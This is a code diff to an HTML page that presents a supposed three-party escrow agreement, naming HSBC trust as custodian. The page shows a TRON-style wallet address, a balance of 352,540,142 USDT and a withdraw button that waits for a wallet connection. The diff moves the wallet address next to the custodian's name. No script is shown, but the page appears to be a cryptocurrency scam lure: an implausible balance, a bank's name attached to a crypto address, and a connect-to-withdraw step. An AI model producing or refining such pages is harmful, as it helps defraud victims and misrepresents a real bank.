@@ -154,10 +154,10 @@
       <p><strong>三方协议信息</strong></p>
       <p>资金方（出资人）：马伯平</p>
       <p>接受方（收款人）：黄福文</p>
-      <p>监管方（托管机构）：汇丰银行信托</p>
+      <p>监管方（托管机构）：汇丰银行信托 TKHuVq1oKVruCGLvqVexFs6dawKv6fQgFs</p>
     </div>
 
-    <p>钱包地址：TKHuVq1oKVruCGLvqVexFs6dawKv6fQgFs<span id="addr">未连接</span></p>
+    <p>钱包地址：<span id="addr">未连接</span></p>
     <p class="balance">352,540,142 USDT</p>
     <button id="btn" disabled>提现 352,540,142 USDT</button>
     <p id="status"></p>
